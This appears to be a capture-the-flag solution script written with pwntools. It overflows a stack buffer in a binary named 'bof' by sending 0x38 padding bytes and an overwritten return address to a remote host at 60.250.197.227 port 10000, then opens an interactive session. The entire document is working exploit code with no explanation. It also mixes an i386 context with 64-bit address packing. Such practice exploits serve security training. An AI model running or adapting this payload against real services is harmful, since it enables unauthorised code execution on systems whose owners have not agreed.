from pwn import *
context(arch='i386', os='linux')
_local = 0
if _local:
    conn = process('./bof-767fdf896cf9838c0294db24eaa1271ebf15a6e638a873e94ab9682ef28464b4')
else:
    conn = remote('60.250.197.227', 10000)
payload = 'a'*0x38 + p64(0x40068b)
conn.sendline(payload)
print(conn.recvline())
conn.interactive()
